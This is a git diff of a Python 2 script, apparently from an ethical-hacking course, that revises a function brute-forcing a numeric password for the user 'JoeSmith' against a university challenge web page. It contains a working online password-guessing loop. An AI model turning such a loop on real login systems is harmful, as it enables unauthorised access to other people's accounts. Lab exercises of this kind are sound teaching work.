@@ -32,17 +32,14 @@ def scanport(host, port):
 def crackHouse():
     """Bruteforce the password for titanium house"""
 
-    for item in range(000, 999):
+    for item in range(600, 999):
         params = {"username":"JoeSmith", "password":item}
-        r = requests.get("http://creative.coventry.ac.uk/eh/web_ch4/welcome.php",
-                         params = params)
-        if r.text.find("incorrect"):
-            print "Fails on {0}".format(item)
+        r = requests.get("http://creative.coventry.ac.uk/eh/web_ch4/welcome.php", params = params)
+        if r.text.find("incorrect")!= -1 : 
+            print "- ".format(item)
         else:
-            print "Passcode {0} Ok".format(item)
+            print ". .".format(item)
             return item
-
-
 
 # Something eye catching/fun but in the same time usable would be perfect here. (CowSay?)
 
